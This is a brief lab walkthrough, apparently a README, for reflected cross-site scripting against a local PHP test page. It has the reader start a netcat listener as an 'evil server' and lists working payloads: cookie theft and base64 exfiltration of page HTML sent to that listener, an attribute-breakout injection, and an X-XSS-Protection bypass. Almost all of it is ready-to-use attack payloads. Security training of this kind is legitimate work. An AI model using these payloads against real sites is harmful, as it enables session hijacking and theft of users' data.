# Reflective XSS

1. Start the target server: `php -S localhost:8000`

2. Start the evil server: `nc -v -l -p 9999`

3. Make sure xss works:
  * `http://localhost:8000/target.php?foo=<script>alert(1);</script>`

4. Exploits:
  * steal cookie: `<script>new Image().src="http://localhost:9999/"%2bdocument.cookie;</script>`
  * get html: `<script>new Image().src="http://localhost:9999/"%2bbtoa(document.children[0].innerHTML);</script>`
  * to target input: `http://localhost:8000/target.php?bar="><script>alert(1);</script>`
  * vulnerability in X-XSS-Protection header: `http://localhost:8000/target2.php?<script> x=2; </script>`

Notes:
* see cheatsheet for xss snippits: [https://html5sec.org/](cheatsheet)
